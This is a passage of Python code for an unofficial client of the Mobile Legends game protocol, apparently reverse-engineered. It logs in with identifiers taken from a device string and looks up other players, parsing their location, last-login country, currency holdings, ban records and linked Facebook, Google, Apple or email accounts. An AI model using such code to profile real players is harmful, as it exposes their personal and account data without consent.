        return await asyncio.wait_for(self.reader.readexactly(n),
                                      timeout=timeout)

    async def recv(self):
        try:
            hdr = await self._read_n(4)
            flags = int.from_bytes(hdr, 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            self.last_header_size = size
            body_len = max(0, size - 4)
            body = await self._read_n(body_len) if body_len else b''

            data = body
            if ctype == 1:
                data = zlib.decompress(data)
            elif ctype == 16:
                data = zstd.decompress(data)
            elif ctype == 2:
                data = _aes_decrypt(data)
            elif ctype == 3:
                data = zlib.decompress(_aes_decrypt(data))
            elif ctype == 18:
                data = zstd.decompress(_aes_decrypt(data))

            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            inner = result.get(6)
            if not isinstance(inner, bytes):
                inner = result.get(5)
                if not isinstance(inner, bytes):
                    return pid, None
            parsed = SdpStruct(inner)
            self._sniff(parsed)
            return pid, parsed
        except (asyncio.TimeoutError, asyncio.IncompleteReadError):
            return -1, None
        except Exception:
            return None, None

    async def login(self):
        await self.connect(LOGIN_HOST, LOGIN_PORT)
        await self.send(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: CLIENT_VERSION,
            3: CHANNEL,
            4: 'en',
        }))
        pid, res = await self.recv()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            zd = res.get(2)
            if isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else:
                self.zone_id = zd or 0
            self.creation_ts = res.get(19, 0)
            return True, res
        return False, res

    async def get_server(self):
        await self.send(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION,
            5: self.zone_id, 6: CHANNEL,
        }))
        pid, res = await self.recv()
        if pid == 6 and res:
            addr = res[1]
            self.game_host, port_str = addr.split(':')
            self.game_port = int(port_str)
            return True, res
        return False, res

    async def enter_game(self):
        await self.close()
        await self.connect(self.game_host, self.game_port)
        await self.send(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id,
        }))
        await self.send(10101, SdpStruct({0: 0, 2: 2}))

    async def handshake(self, tries=10):
        for _ in range(tries):
            pid, _ = await self.recv()
            if pid is None or pid == -1:
                return False
            if pid == 10002:
                return True
        return False

    async def lookup(self, value, kind='id'):
        if kind == 'id':
            try:
                payload = SdpStruct({1: int(value)})
            except (TypeError, ValueError):
                return None
        else:
            payload = SdpStruct({0: str(value).strip()})
        await self.send(11153, payload)
        miss = 0
        while True:
            pid, res = await self.recv()
            if pid is None or pid == -1:
                return None
            if pid == 11154:
                return res
            if pid == 20001:
                miss += 1
                if self.last_header_size < 100 and miss >= 3:
                    return None

LOGIN_HOST = 'global-login.ml.youngjoygame.com'
LOGIN_PORT = 30021
CLIENT_VERSION = '2.2.16.1232.1'
CHANNEL = 'and_usa'

class GameConn:
    def __init__(self, device_id):
        self.device_id = device_id
        self.host = LOGIN_HOST
        self.port = LOGIN_PORT
        self.sequence = 1
        self.socket = None
        self.queue = b''
        self.last_header_size = 0

        parts = device_id.split('_')
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info = info + '_' + parts[2]
            if len(info) >= 32:
                self.imei_md5 = info[:32]
                self.android_id = info[32:48] if len(info) >= 48 else ''
                self.advertising_id = info[48:] if len(info) > 48 else ''
            else:
                self.imei_md5 = info
                self.android_id = ''
                self.advertising_id = ''
        else:
            self.imei_md5 = device_id
            self.android_id = ''
            self.advertising_id = ''

        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0

        self.ban_seen = False
        self.ban_info = {}

    def _sniff(self, res):
        if self.ban_seen or res is None:
            return
        banned, info = inspect_ban(res)
        if banned:
            self.ban_seen = True
            self.ban_info = dict(info)

    def connect(self, host=None, port=None):
        if host:
            self.host = host
        if port:
            self.port = port
        ip = _resolve(self.host)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.setsockopt(socket.IPPROTO_TCP,
                                   socket.TCP_NODELAY, 1)
            self.socket.setsockopt(socket.SOL_SOCKET,
                                   socket.SO_REUSEADDR, 1)
            self.socket.setsockopt(socket.SOL_SOCKET,
                                   socket.SO_KEEPALIVE, 1)
        except Exception:
            pass
        self.socket.settimeout(2)
        try:
            self.socket.connect((ip, self.port))
        except Exception:
            netfail_note(False)
            raise
        netfail_note(True)
    def close(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.socket = None
        self.sequence = 1
        self.queue = b''

    def send(self, pid, sdp):
        packet = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        size = len(buf) + 4
        if size > 0xFFFFFF:
            raise SdpError('packet too large')
        flags = size | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + buf)
        self.sequence += 1

    def recv(self):
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d

            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            self.last_header_size = size

            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d

            data = self.queue[4:size]
            self.queue = self.queue[size:]

            if ctype == 1:
                data = zlib.decompress(data)
            elif ctype == 16:
                data = zstd.decompress(data)
            elif ctype == 2:
                data = _aes_decrypt(data)
            elif ctype == 3:
                data = zlib.decompress(_aes_decrypt(data))
            elif ctype == 18:
                data = zstd.decompress(_aes_decrypt(data))

            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            body = result.get(6)
            if not isinstance(body, bytes):
                body = result.get(5)
                if not isinstance(body, bytes):
                    return pid, None
            parsed = SdpStruct(body)
            self._sniff(parsed)
            return pid, parsed
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None

    def login(self):
        self.connect(LOGIN_HOST, LOGIN_PORT)
        self.send(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: CLIENT_VERSION,
            3: CHANNEL,
            4: 'en',
        }))
        pid, res = self.recv()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            zd = res.get(2)
            if isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else:
                self.zone_id = zd or 0
            self.creation_ts = res.get(19, 0)
            return True, res
        return False, res

    def get_server(self):
        self.send(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION,
            5: self.zone_id, 6: CHANNEL,
        }))
        pid, res = self.recv()
        if pid == 6 and res:
            addr = res[1]
            self.game_host, port_str = addr.split(':')
            self.game_port = int(port_str)
            return True, res
        return False, res

    def enter_game(self):
        self.close()
        self.connect(self.game_host, self.game_port)
        self.send(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id,
        }))
        self.send(10101, SdpStruct({0: 0, 2: 2}))

    def handshake(self, tries=10):
        for _ in range(tries):
            pid, _ = self.recv()
            if pid is None or pid == -1:
                return False
            if pid == 10002:
                return True
        return False

    def verify_role(self, tries=8):
        self.send(10003, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            3: CLIENT_VERSION, 4: CHANNEL, 5: self.device_id,
        }))
        for _ in range(tries):
            pid, _ = self.recv()
            if pid is None or pid == -1:
                return False
            if pid in (10004, 10008):
                return True
        return False

    def lookup(self, value, kind='id'):
        if kind == 'id':
            try:
                payload = SdpStruct({1: int(value)})
            except (TypeError, ValueError):
                return None
        else:
            payload = SdpStruct({0: str(value).strip()})
        self.send(11153, payload)

        miss = 0
        while True:
            pid, res = self.recv()
            if pid is None or pid == -1:
                return None
            if pid == 11154:
                return res
            if pid == 20001:
                miss += 1
                if self.last_header_size < 100 and miss >= 3:
                    return None

    def role_info(self, role_id, zone_id):
        self.send(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        best = None
        for _ in range(30):
            pid, res = self.recv()
            if pid is None or pid == -1:
                break
            if pid == 20001:
                continue
            if pid == 10129 and res is not None:
                if best is None:
                    best = res
                try:
                    if int(res.get(9, 0) or 0) > 0:
                        return res
                except (TypeError, ValueError):
                    pass
        return best

    def skin_info(self, role_id, zone_id, tries=3):
        for _ in range(tries):
            self.send(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            timeouts = 0
            while timeouts < 3:
                pid, res = self.recv()
                if pid is None:
                    break
                if pid == -1:
                    timeouts += 1
                elif pid == 10144:
                    return res
                elif pid == 20001:
                    continue
        return None

    def v2l_status(self, role_id, zone_id, tries=2):
        for _ in range(tries):
            self.send(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            timeouts = 0
            while timeouts < 2:
                pid, res = self.recv()
                if pid is None:
                    break
                if pid == -1:
                    timeouts += 1
                elif pid == 10208 and res:
                    return {'_src': 10208, '_data': dict(res)}
                elif pid == 20001:
                    continue

            self.send(10145, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            timeouts = 0
            while timeouts < 2:
                pid, res = self.recv()
                if pid is None:
                    break
                if pid == -1:
                    timeouts += 1
                elif pid in (10146, 10160) and res:
                    return {'_src': pid, '_data': dict(res)}
                elif pid == 20001:
                    continue
        return None

BAN_REASONS = {
    '21': 'Using Plug-in Apps to Compromise Competitive Fairness',
    '22': 'Account Sharing / Boosting',
    '23': 'Verbal Abuse / Toxic Behavior',
    '24': 'Cheating in Ranked Match',
    '25': 'Payment Fraud / Chargeback',
    '26': 'Account Trading / Sale',
}

def _walk_ban(obj, out, depth=0):
    if depth > 6:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            k_lower = str(k).lower()
            if k == 'ban_reason':
                code = str(v)
                if code in BAN_REASONS:
                    out['ban_code'] = code
                    out['reason_name'] = BAN_REASONS[code]
                elif code and code != '0':
                    out.setdefault('ban_code', code)
                    out.setdefault('reason_name', BAN_REASONS.get('21'))
            elif k == 'endtime_day':
                if v is not None:
                    out['endtime_day'] = v
            elif k == 'endtime_hour':
                if v not in (None, 0):
                    out['endtime_hour'] = v
            elif k == 'endtime_min':
                if v not in (None, 0):
                    out['endtime_min'] = v
            elif k == 'endtime_sec':
                if v not in (None, 0):
                    out['endtime_sec'] = v
            elif k == 'ban_status' or 'ban_status' in k_lower:
                if v not in (None, 0, False, '0', ''):
                    out['ban_status_raw'] = v
            if isinstance(v, (dict, list)):
                _walk_ban(v, out, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            _walk_ban(item, out, depth + 1)


def inspect_ban(sdp):
    """STRICT: banned ONLY when endtime_day is present and not None/0."""
    info = {}
    if sdp:
        try:
            _walk_ban(dict(sdp), info)
        except Exception:
            pass

    banned = False
    day = info.get('endtime_day')
    if day is not None:
        try:
            d_int = int(day)
            if d_int > 0:
                banned = True
        except (TypeError, ValueError):
            banned = True

    if not banned and info.get('ban_code') in BAN_REASONS:
        banned = True

    # fallback: any explicit ban_status field that says banned
    if not banned:
        raw = info.get('ban_status_raw')
        if raw is not None:
            s = str(raw).strip().lower()
            if s in ('1', 'true', 'yes', 'banned', 'ban'):
                banned = True
                info.setdefault('ban_code', '21')
                info.setdefault('reason_name', BAN_REASONS.get('21'))

    return banned, info


def format_ban_duration(info):
    day = info.get('endtime_day')
    if day is None:
        return None
    h = as_int(info.get('endtime_hour', 0))
    m = as_int(info.get('endtime_min', 0))
    s = as_int(info.get('endtime_sec', 0))
    try:
        d = int(day)
    except (TypeError, ValueError):
        return None
    if d > 1000000000:
        ts = fmt_ts_full(d)
        if ts:
            return f"until {ts}"
    if d > 0:
        return f"{d}d {h:02d}h {m:02d}m"
    if h or m or s:
        return f"{h:02d}h {m:02d}m {s:02d}s"
    return "permanent"

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny",
    18: "Layla", 19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya",
    23: "Gord", 24: "Natalia", 25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha",
    29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson", 33: "Cyclops",
    34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana",
    39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley", 43: "Irithel",
    44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley",
    54: "Jawhead", 55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis",
    59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja", 63: "Selena",
    64: "Aldous", 65: "Claude", 66: "Vale", 67: "Leomord", 68: "Lunox",
    69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith",
    74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg",
    84: "Ling", 85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha",
    89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla", 93: "Atlas",
    94: "Popol and Kupa", 95: "Yu Zhong", 96: "Luo Yi", 97: "Benedetta",
    98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda",
    103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan",
    108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn",
    118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan",
    123: "Cici", 124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas",
    128: "Kalea", 129: "Zetian", 130: "Obsidia",
}

EMBLEM_MAP = {
    1: "Fighter", 2: "Assassin", 3: "Mage", 4: "Marksman",
    5: "Support", 6: "Tank", 7: "Common",
}

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold",
                4: "Platinum", 5: "Diamond"}

MODE_MAP = {
    0: "Classic", 1: "Ranked", 2: "Brawl",
    3: "AI", 4: "Custom", 5: "Mayhem", 6: "Arcade",
}

SKIN_TIER_MAP = {1: "Common", 2: "Exceptional", 3: "Deluxe",
                 4: "Exquisite", 5: "Grand", 6: "Supreme"}

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"),
    (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"),
    (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"),
    (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"),
    (280000, float('inf'), "World Collector"),
]

def map_rank(p):
    try:
        p = int(p)
    except (TypeError, ValueError):
        return "Unranked"
    if p <= 0:
        return "Unranked"
    table = [
        (0, 4, "Warrior III"), (5, 9, "Warrior II"), (10, 14, "Warrior I"),
        (15, 19, "Elite IV"), (20, 24, "Elite III"), (25, 29, "Elite II"),
        (30, 34, "Elite I"),
        (35, 39, "Master IV"), (40, 44, "Master III"), (45, 49, "Master II"),
        (50, 54, "Master I"),
        (55, 59, "Grandmaster IV"), (60, 64, "Grandmaster III"),
        (65, 69, "Grandmaster II"), (70, 74, "Grandmaster I"),
        (75, 81, "Epic IV"), (82, 88, "Epic III"), (89, 95, "Epic II"),
        (96, 107, "Epic I"),
        (108, 114, "Legend IV"), (115, 121, "Legend III"),
        (122, 128, "Legend II"), (129, 135, "Legend I"),
    ]
    for lo, hi, name in table:
        if lo <= p <= hi:
            return name
    if 136 <= p <= 160:
        return f"Mythic {p - 135}"
    if 161 <= p <= 195:
        return f"Mythical Honor {p - 135}"
    if 196 <= p <= 235:
        return f"Mythical Glory {p - 195}"
    if p >= 236:
        return f"Mythical Immortal {p - 235}"
    return "Unranked"

def map_collector(p):
    try:
        p = int(p)
    except (TypeError, ValueError):
        return "No Tier"
    if p < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= p < hi:
            if name == "World Collector":
                return name
            span = (hi - lo) / 5
            lvl = int((p - lo) // span)
            lvl = max(0, min(4, lvl))
            roman = ["V", "IV", "III", "II", "I"][lvl]
            return f"{name} {roman}"
    return "No Tier"

def fmt_ts(ts):
    if not isinstance(ts, int) or ts < 100000000:
        return None
    try:
        utc = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
        pht = utc + datetime.timedelta(hours=8)
        return pht.strftime("%Y-%m-%d %H:%M")
    except Exception:
        return None

def fmt_ts_full(ts):
    if not isinstance(ts, int) or ts < 100000000:
        return None
    try:
        utc = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
        pht = utc + datetime.timedelta(hours=8)
        return pht.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return None

_SKIN_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skin_db.json')
SKIN_DB = {}
try:
    if os.path.isfile(_SKIN_DB_PATH):
        with open(_SKIN_DB_PATH, 'r', encoding='utf-8') as _f:
            _raw = _f.read().strip()
            if _raw and not _raw.startswith('{'):
                _raw = '{' + _raw
            if _raw:
                SKIN_DB = json.loads(_raw)
except Exception:
    SKIN_DB = {}

_SKIN_TIER_LABELS = {
    'common':      'Common',
    'exceptional': 'Exceptional',
    'deluxe':      'Deluxe',
    'exquisite':   'Exquisite',
    'grand':       'Grand',
    'supreme':     'Supreme',
    'unknown':     'Unknown',
}

def get_skin_tier(skin_id):
    tier = SKIN_DB.get(str(skin_id))
    if not tier:
        return None
    return _SKIN_TIER_LABELS.get(tier, tier.capitalize())

def parse_skin_counts(tag_118):
    if not tag_118 or not isinstance(tag_118, dict):
        return {}
    skin_data = None
    for k in (4, 0, 1):
        v = tag_118.get(k)
        if isinstance(v, dict) and v:
            skin_data = v
            break
    if skin_data is None:
        skin_data = tag_118
    if not isinstance(skin_data, dict):
        return {}
    counts = {
        6: "Supreme Skins", 5: "Grand Skins", 4: "Exquisite Skins",
        3: "Deluxe Skins", 2: "Exceptional Skins", 1: "Common Skins",
    }
    out = {}
    for skin_id, count in skin_data.items():
        try:
            sid = int(skin_id)
        except (ValueError, TypeError):
            continue
        if sid in counts:
            out[counts[sid]] = count
    return out

def _find_last_match_ts(entry):

    if not isinstance(entry, dict):
        return 0
    now = int(time.time())
    lower = now - 3 * 365 * 86400
    upper = now + 2 * 86400

    def _norm(v):
        if not isinstance(v, int) or isinstance(v, bool):
            return None
        if v > 10 ** 15:
            v //= 1_000_000
        elif v > 10 ** 12:
            v //= 1_000
        return v if lower <= v <= upper else None

    for key in (9, 10, 6, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18):
        t = _norm(entry.get(key))
        if t:
            return t

    for v in entry.values():
        t = _norm(v)
        if t:
            return t

    for v in entry.values():
        if isinstance(v, dict):
            for vv in v.values():
                t = _norm(vv)
                if t:
                    return t

    for v in entry.values():
        if isinstance(v, str):
            for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"):
                try:
                    dt = datetime.datetime.strptime(v.strip(), fmt)
                    return int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())
                except Exception:
                    pass

    return 0

def extract_last_match(ri, p):
    containers = []
    for src in (ri, p):
        if not isinstance(src, dict):
            continue
        for tag in (120, 130, 145, 150, 190, 200, 33, 35, 40, 55,
                    70, 78, 85, 88, 99, 105, 110, 100):
            v = src.get(tag)
            if isinstance(v, (dict, list)) and v:
                containers.append(v)

    entry = None
    for c in containers:
        if isinstance(c, list) and c and isinstance(c[0], dict):
            entry = c[0]
            break
        if isinstance(c, dict):
            for k in sorted(c.keys(), key=lambda x: (isinstance(x, str), x)):
                if isinstance(c[k], dict):
                    entry = c[k]
                    break
            if entry:
                break

    if not entry:
        return None

    hero_id = entry.get(0, 0) or entry.get(1, 0) or 0
    hero = HERO_ID_MAP.get(hero_id, f"Hero#{hero_id}") if hero_id else "?"

    kills    = as_int(entry.get(2, 0))
    deaths   = as_int(entry.get(3, 0))
    assists  = as_int(entry.get(4, 0))
    duration = as_int(entry.get(5, 0))
    result_raw = entry.get(6, entry.get(7, 0))
    mode_raw = entry.get(8, 0)
    ts       = _find_last_match_ts(entry)
    mvp      = entry.get(11, 0)
    gold     = as_int(entry.get(12, 0))

    if result_raw in (1, '1', 'win', 'WIN', True):
        result = "WIN"
    elif result_raw in (0, '0', 'loss', 'LOSS', False):
        result = "LOSS"
    else:
        result = "?"

    mode_key = as_int(mode_raw, -1)
    mode = MODE_MAP.get(mode_key, f"Mode {mode_raw}")

    return {
        'hero':       hero,
        'kills':      kills,
        'deaths':     deaths,
        'assists':    assists,
        'kda':        f"{kills}/{deaths}/{assists}",
        'kda_ratio':  round((kills + assists) / max(deaths, 1), 2),
        'result':     result,
        'mode':       mode,
        'duration':   human_dur(duration) if duration else "?",
        'duration_s': duration,
        'gold':       gold,
        'mvp':        bool(mvp),
        'played_at':  fmt_ts(ts),
        'played_ts':  ts,
    }

def extract_player(result, role_info=None, creation_ts=0, v2l=None):
    if not result or not result.get(0):
        return None
    first = result[0]
    if isinstance(first, dict):
        p = first
    elif isinstance(first, list) and first and isinstance(first[0], dict):
        p = first[0]
    else:
        return None
    try:
        ri = role_info if isinstance(role_info, dict) else {}

        nickname = p.get(2, "") or "Unknown"
        player_id = p.get(0, 0)
        server = p.get(1, 0)
        level = as_int(p.get(3, 0))

        skin_count = as_int(p.get(83, 0))
        hero_count = as_int(p.get(4, 0))
        matches = as_int(p.get(17, 0))
        rating_score = as_int(p.get(9, 0))
        if ri:
            hero_count = as_int(ri.get(9, hero_count)) or hero_count
            matches = as_int(ri.get(22, matches)) or matches

        loc = p.get(71)
        if isinstance(loc, list) and len(loc) >= 2:
            location = ", ".join(str(x) for x in loc if x)
        else:
            location = None

        last_login = fmt_ts(p.get(5, 0))
        last_country = p.get(87, "")
        reg_country = p.get(97, "")

        squad_icon = p.get(31, "")
        squad_name = str(p.get(30, "")).replace("`", "").strip()
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else None

        rank_now = map_rank(p.get(8))
        rank_top = map_rank(p.get(95))
        ach = p.get(7, 0)

        t136 = p.get(136, {})
        coll_pts = t136.get(9, 0) if isinstance(t136, dict) else 0

        t91 = p.get(91, [])
        history = [HERO_ID_MAP.get(h, f"Hero#{h}") for h in reversed(t91)] if t91 else []

        v2l_status = None
        if v2l and isinstance(v2l, dict):
            src = v2l.get("_src", 0)
            data = v2l.get("_data", {})
            probes = (10, 11) if src == 10208 else (0, 2, 3, 5)
            for tag in probes:
                v = data.get(tag)
                if v is not None:
                    try:
                        v2l_status = "Enabled" if int(v) > 0 else "Disabled"
                        break
                    except (ValueError, TypeError):
                        pass

        followers = ri.get(23, 0) or p.get(15, 0) or 0

        likes = 0
        motto = None
        ri24 = ri.get(24)
        if isinstance(ri24, int):
            likes = ri24
        elif isinstance(ri24, str) and ri24.strip():
            motto = ri24.strip()
        if not likes:
            likes = p.get(61, 0) or 0

        credits = None
        cs = ri.get(20, 0) or p.get(80, 0)
        if isinstance(cs, int) and cs > 0:
            credits = f"{cs}/110"

        restriction = None
        t117 = ri.get(117, p.get(117))
        if t117 is not None:
            if isinstance(t117, dict):
                raw = t117.get(0, 0)
            elif isinstance(t117, int):
                raw = t117
            else:
                raw = 0
            flags = int(raw) + 1
            pctv = round((flags / 7) * 100, 1)
            if pctv < 30:
                restriction = f"{pctv}% low risk"
            elif pctv < 60:
                restriction = f"{pctv}% medium risk"
            else:
                restriction = f"{pctv}% high risk"

        affinity = None
        names = []
        for entry in ri.get(82, []) or []:
            if isinstance(entry, dict):
                n = entry.get(2, "")
                if isinstance(n, str) and n:
                    names.append(n)
        if names:
            affinity = ", ".join(names)
        else:
            t135 = p.get(135, {})
            aff_lvl = t135.get(1, 0) if isinstance(t135, dict) else 0
            if aff_lvl:
                affinity = AFFINITY_MAP.get(aff_lvl, f"Level {aff_lvl}")

        sl_exp = 0
        for tag in (21, 47, 50):
            v = ri.get(tag) or p.get(tag) or 0
            if isinstance(v, int) and v > 1700000000:
                sl_exp = v
                break
        starlight = "Yes" if sl_exp > time.time() else "No"
        starlight_expiry = fmt_ts(sl_exp) if sl_exp else None

        starlight_months = p.get(60, 0) or 0
        tickets = ri.get(49, 0) or p.get(49, 0) or 0
        total_wins = p.get(18, 0) or 0

        min_ts = 1451577600
        fallback = p.get(6, 0)
        if creation_ts and creation_ts >= min_ts:
            created = fmt_ts_full(creation_ts)
            age_ts = creation_ts
        elif fallback and fallback >= min_ts:
            created = fmt_ts_full(fallback)
            age_ts = fallback
        else:
            created = None
            age_ts = 0

        age = None
        if age_ts:
            now = datetime.datetime.now(datetime.timezone.utc)
            start = datetime.datetime.fromtimestamp(age_ts, datetime.timezone.utc)
            d = (now - start).days
            y, m, r = d // 365, (d % 365) // 30, d % 30
            if y:
                age = f"{y}y {m}m {r}d"
            elif m:
                age = f"{m}m {r}d"
            else:
                age = f"{d}d"

        win_count = ri.get(22, 0) or 0
        total_battles = ri.get(77, 0) or p.get(17, 0) or 0

        win_rate = None
        wins_for_rate = win_count if win_count else total_wins
        if total_battles > 0 and wins_for_rate > 0:
            wr = (wins_for_rate / total_battles) * 100
            win_rate = f"~{min(wr, 100):.1f}%" if wr > 100 else f"{wr:.1f}%"

        diamonds = 0
        bp = 0
        cur = ri.get(111)
        if isinstance(cur, dict):
            diamonds = as_int(cur.get(0, 0))
            bp = as_int(cur.get(1, 0))
        elif isinstance(cur, int):
            diamonds = cur
        elif isinstance(cur, list) and cur:
            diamonds = as_int(cur[0]) if len(cur) > 0 else 0
            bp = as_int(cur[1]) if len(cur) > 1 else 0
        if not bp:
            bp = int(p.get(83, 0) or 0)

        last_dia = fmt_ts(p.get(42, 0))
        mcl_wins = ri.get(46, 0) or p.get(104, p.get(103, 0)) or 0

        skin_counts = {
            "Supreme Skins":     0,
            "Grand Skins":       0,
            "Exquisite Skins":   0,
            "Deluxe Skins":      0,
            "Exceptional Skins": 0,
            "Common Skins":      0,
        }
        t118 = ri.get(118) or p.get(118)
        if t118:
            parsed = parse_skin_counts(t118)
            if parsed:
                skin_counts.update(parsed)

        latest_skin_id = None
        latest_skin_raw = p.get(175, 0)
        if latest_skin_raw:
            tier_label = get_skin_tier(latest_skin_raw) or "Unknown"
            latest_skin_id = f"{latest_skin_raw} ({tier_label})"
        latest_skin_date = fmt_ts(p.get(176, 0))

        skin_history = []
        for entry in (ri.get(92) or [])[:8]:
            if isinstance(entry, dict):
                sid = entry.get(0, 0)
                tier = entry.get(2, 0)
                ts = entry.get(4, 0)
                tname = SKIN_TIER_MAP.get(tier, f"T{tier}")
                date = fmt_ts(ts) or "?"
                skin_history.append(f"{sid}({tname})|{date}")

        emblems = []
        tag101 = ri.get(101)
        if isinstance(tag101, dict) and tag101:
            for eid in sorted(tag101.keys()):
                name = EMBLEM_MAP.get(eid, f"E{eid}")
                emblems.append(f"{name}:Lv{tag101[eid]}")

        last_heroes = []
        t45 = p.get(45, {})
        if isinstance(t45, dict) and t45:
            entries = []
            for entry in t45.values():
                if isinstance(entry, dict):
                    hid = entry.get(0, 0)
                    hts = entry.get(1, 0)
                    entries.append((hts, HERO_ID_MAP.get(hid, f"Hero#{hid}")))
            entries.sort(key=lambda x: x[0], reverse=True)
            last_heroes = [h for _, h in entries[:8]]

        last_match = extract_last_match(ri, p)


        # ── BINDINGS EXTRACTION ──────────────────────────────────
        binds = []
        for tag, keys in (
            ("Facebook", (100, 101, 102, 110)),
            ("Google",   (103, 104, 111)),
            ("TikTok",   (105, 112)),
            ("Moonton",  (9, 11, 12, 13)),
            ("Apple",    (106, 113)),
            ("VK",       (107,)),
            ("Telegram", (108,)),
        ):
            for k in keys:
                v = p.get(k)
                if v is None:
                    continue
                if isinstance(v, (str, int)) and str(v).strip() not in ("", "0"):
                    binds.append(tag)
                    break
                if isinstance(v, (dict, list)) and v:
                    binds.append(tag)
                    break

        for k, v in p.items():
            if not isinstance(v, str):
                continue
            low = v.lower()
            if "@" in v and "." in v.split("@")[-1] and len(v) < 80:
                if "Moonton" not in binds and "Mail" not in binds:
                    binds.append("Mail")
            if "facebook" in low and "Facebook" not in binds:
                binds.append("Facebook")
            if "google" in low and "Google" not in binds:
                binds.append("Google")
            if "tiktok" in low and "TikTok" not in binds:
                binds.append("TikTok")
            if "apple" in low and "Apple" not in binds:
                binds.append("Apple")

        bindings_str = ", ".join(dict.fromkeys(binds)) if binds else "Device Only"

        return {
            'last_match': last_match,
            'nickname': nickname,
            'player_id': player_id,
            'server': server,
            'level': level,
            'skin_count': skin_count,
            'hero_count': hero_count,
            'matches': matches,
            'rating_score': rating_score,
            'location': location,
            'last_login': last_login,
            'last_login_ts': as_int(p.get(5, 0)),
            'last_login_country': last_country or None,
            'region_country': reg_country or None,
            'high_rank': rank_top,
            'current_rank': rank_now,
            'achievement_points': ach,
            'collector_point': coll_pts,
